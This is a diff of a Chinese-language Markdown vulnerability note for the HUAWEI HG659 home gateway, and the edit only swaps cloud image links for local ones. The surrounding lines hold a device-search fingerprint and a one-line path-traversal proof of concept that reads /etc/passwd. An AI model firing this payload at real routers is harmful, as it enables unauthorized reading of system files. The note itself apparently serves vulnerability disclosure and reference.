@@ -20,7 +20,7 @@ app="HUAWEI-Home-Gateway-HG659"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110951141.png)
+![](./images/202202110951141.png)
 
 POC如下
 
@@ -28,4 +28,4 @@ POC如下
 /lib///....//....//....//....//....//....//....//....//etc//passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110951927.png)
+![](./images/202202110951927.png)
